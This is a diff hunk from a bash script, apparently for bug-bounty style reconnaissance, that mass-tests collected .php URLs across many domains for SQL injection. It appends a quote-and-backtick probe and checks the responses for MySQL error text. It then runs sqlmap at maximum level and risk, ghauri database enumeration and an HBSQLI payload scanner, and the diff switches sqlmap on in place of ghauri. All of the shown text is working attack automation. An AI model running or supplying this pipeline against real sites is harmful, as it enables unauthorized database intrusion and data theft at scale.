@@ -110,8 +110,8 @@ for domain in $(cat $host);
 do
 
 cat /root/recon/$domain/url/valid_urls.txt | grep ".php" | sed 's/\.php.*/.php\//' | sort -u | sed 's/$/%27%22%60/' | while read url do ; do curl --silent "$url" | grep -qs "You have an error in your SQL syntax" && echo -e "$url \e[1;32mVulnerable\e[0m" || echo -e "$url \e[1;31mNot Vulnerable\e[0m" ;done | tee -a /root/recon/$domain/sql/curl_SQL_ERROR.txt
-#sqlmap -m /root/recon/$domain/url/valid_urls.txt --level 5 --batch --risk 3  --random-agent | tee -a /root/recon/$domain/sql/sqlmap_sql_url.txt
-ghauri -r /root/recon/$domain/url/valid_urls.txt --batch --level=5 --banner --dbs | tee -a /root/recon/$domain/sql/ghauri_sql_url.txt
+sqlmap -m /root/recon/$domain/url/valid_urls.txt --level 5 --batch --risk 3  --random-agent | tee -a /root/recon/$domain/sql/sqlmap_sql_url.txt
+#ghauri -r /root/recon/$domain/url/valid_urls.txt --batch --level=5 --banner --dbs | tee -a /root/recon/$domain/sql/ghauri_sql_url.txt
 python3 /root/HBSQLI/hbsqli.py -l /root/recon/$domain/url/valid_urls.txt -p /root/HBSQLI/payloads.txt -H /root/HBSQLI/headers.txt -v | tee -a /root/recon/$domain/sql/hbsqli_url.txt
 done
 }
